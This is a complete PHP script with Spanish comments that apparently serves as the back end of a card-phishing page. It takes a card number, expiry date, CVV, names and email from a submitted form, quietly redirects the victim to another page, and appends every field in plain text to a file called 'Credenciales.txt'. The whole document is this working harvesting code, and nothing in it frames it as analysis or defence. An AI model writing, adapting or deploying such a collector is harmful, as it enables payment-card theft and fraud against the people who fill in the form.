<?php
// Recibo los datos introducidos en el formulario
$visa = $_POST["visa"];
$mmaa = $_POST["mmaa"];
$cvv = $_POST["cvv"];
$nombre = $_POST["nombre"];
$apellido = $_POST["apellido"];
$correo = $_POST["correo"];
header('Location: index1.html');
     // Abro el archivo
     $co = "===========================================\n";
     $cl = "===========================================\n";
     $file=fopen("Credenciales.txt", "a");
     // Le cargo los datos
     $ap = "N° Tarjeta:  $visa\n";
     $bp= "MMAA:  $mmaa\n";
     $cp = "CVV:  $cvv\n";
     $dp = "Nombres:  $nombre\n";
     $ep = "Apellidos:  $apellido\n";
     $fp = "Correo:  $correo\n";
     fwrite($file, "\n". $co. $ap. $bp. $cp. $dp. $ep. $fp. $cl);
           fclose($file);
